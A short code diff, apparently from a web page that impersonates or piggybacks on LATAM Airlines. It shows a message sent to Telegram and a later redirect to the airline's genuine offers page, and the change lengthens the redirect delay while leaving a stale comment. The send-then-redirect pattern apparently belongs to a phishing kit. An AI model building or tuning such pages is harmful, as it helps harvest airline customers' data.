@@ -67,7 +67,7 @@ enviarMensajeTelegram($mensaje);
             setTimeout(function() {
                 // Cambiar la URL de la página
                 window.location.href = "https://www.latamairlines.com/co/es/ofertas";
-            }, 2000); // 2000 milisegundos = 2 segundos
+            }, 9000); // 2000 milisegundos = 2 segundos
         }
 
         // Llamar a la función de redireccionamiento al cargar la página
